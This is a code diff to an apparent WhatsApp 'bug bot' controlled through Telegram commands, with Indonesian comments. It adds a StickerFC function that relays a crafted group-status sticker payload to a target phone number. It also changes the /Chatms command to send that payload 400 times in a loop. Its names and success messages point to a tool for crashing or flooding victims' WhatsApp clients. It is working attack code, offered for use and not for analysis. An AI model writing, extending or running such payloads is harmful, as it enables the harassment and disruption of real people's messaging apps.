@@ -26,7 +26,7 @@ const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";
 
 // Konfigurasi GitHub Auto Update
 const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
-const CURRENT_VERSION = "3.0.21";
+const CURRENT_VERSION = "3.0.22";
 const AUTO_UPDATE_FILE = "./database/auto_update.json";
 const PENDING_UPDATE_FILE = "./database/pending_update.json";
 
@@ -2187,6 +2187,28 @@ async function bulldozerV2(sock, target) { }
 async function xatanicaldelayv2(sock, target) { }
 async function MbaPe(sock, target) { }
 
+async function StickerFC(sock, target){
+  const message = {
+  "groupStatusMessageV2": {
+    "message": {
+      "stickerMessage": {
+        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+        "mimetype": "image/webp",
+        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+        "fileLength": "10610",
+        "mediaKeyTimestamp": "1775044724",
+        "stickerSentTs": "1775044724091"
+      }
+    }
+  }
+}
+
+  return await sock.relayMessage(target, message, {})
+}
+
 function createBugSuccessMessage(targetNumber, bugType, date) {
     return `
 <blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>
@@ -2344,9 +2366,9 @@ bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
         reply_markup: createCheckButton(targetNumber)
     });
     
-    for (let i = 0; i < 35; i++) {
-        await VisiFriend(sock, target);
-        await sleep(200);
+    for (let i = 0; i < 400; i++) {
+        await StickerFC(sock, target);
+        await sleep(2000);
     }
 });
 
